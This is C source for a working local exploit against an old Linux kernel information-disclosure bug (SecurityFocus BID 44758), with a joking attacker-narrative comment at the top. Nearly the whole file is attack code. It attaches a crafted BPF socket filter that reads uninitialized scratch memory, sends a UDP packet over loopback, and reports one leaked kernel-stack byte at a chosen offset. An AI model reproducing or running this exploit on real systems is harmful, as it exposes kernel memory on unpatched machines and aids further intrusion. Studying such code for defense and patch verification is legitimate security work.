/*
source: https://www.securityfocus.com/bid/44758/info

The Linux kernel is prone to a local information-disclosure vulnerability.

Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks.
*/

/*
 * You've done it.  After hours of gdb and caffeine, you've finally got a shell
 * on your target's server.  Maybe next time they will think twice about
 * running MyFirstCompSciProjectFTPD on a production machine.  As you take
 * another sip of Mountain Dew and pick some of the cheetos out of your beard,
 * you begin to plan your next move - it's time to tackle the kernel.
 *
 * What should be your goal?  Privilege escalation?  That's impossible, there's
 * no such thing as a privilege escalation vulnerability on Linux.  Denial of
 * service?  What are you, some kind of script kiddie?  No, the answer is
 * obvious.  You must read the uninitialized bytes of the kernel stack, since
 * these bytes contain all the secrets of the universe and the meaning of life.
 *
 * How can you accomplish this insidious feat?  You immediately discard the
 * notion of looking for uninitialized struct members that are copied back to
 * userspace, since you clearly need something far more elite.  In order to
 * prove your superiority, your exploit must be as sophisticated as your taste
 * in obscure electronic music.  After scanning the kernel source for good
 * candidates, you find your target and begin to code...
 *
 * by Dan Rosenberg
 *
 * Greets to kees, taviso, jono, spender, hawkes, and bla
 *
 */

#include <string.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/filter.h>

#define PORT 37337

int transfer(int sendsock, int recvsock)
{

        struct sockaddr_in addr;
        char buf[512];
        int len = sizeof(addr);

        memset(buf, 0, sizeof(buf));

        if (fork())
                return recvfrom(recvsock, buf, 512, 0, (struct sockaddr *)&addr, &len);

        sleep(1);

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");

        sendto(sendsock, buf, 512, 0, (struct sockaddr *)&addr, len);

        exit(0);

}

int main(int argc, char * argv[])
{

        int sendsock, recvsock, ret;
        unsigned int val;
        struct sockaddr_in addr;
        struct sock_fprog fprog;
        struct sock_filter filters[5];

        if (argc != 2) {
                printf("[*] Usage: %s offset (0-63)\n", argv[0]);
                return -1;
        }

        val = atoi(argv[1]);

        if (val > 63) {
                printf("[*] Invalid byte offset (must be 0-63)\n");
                return -1;
        }

        recvsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        sendsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (recvsock < 0 || sendsock < 0) {
                printf("[*] Could not create sockets.\n");
                return -1;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(recvsock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                printf("[*] Could not bind socket.\n");
                return -1;
        }

        memset(&fprog, 0, sizeof(fprog));
        memset(filters, 0, sizeof(filters));

        filters[0].code = BPF_LD|BPF_MEM;
        filters[0].k = (val & ~0x3) / 4;

        filters[1].code = BPF_ALU|BPF_AND|BPF_K;
        filters[1].k = 0xff << ((val % 4) * 8);

        filters[2].code = BPF_ALU|BPF_RSH|BPF_K;
        filters[2].k = (val % 4) * 8;

        filters[3].code = BPF_ALU|BPF_ADD|BPF_K;
        filters[3].k = 256;

        filters[4].code = BPF_RET|BPF_A;

        fprog.len = 5;
        fprog.filter = filters;

        if (setsockopt(recvsock, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog)) < 0) {
                printf("[*] Failed to install filter.\n");
                return -1;
        }

        ret = transfer(sendsock, recvsock);

        printf("[*] Your byte: 0x%.02x\n", ret - 248);

}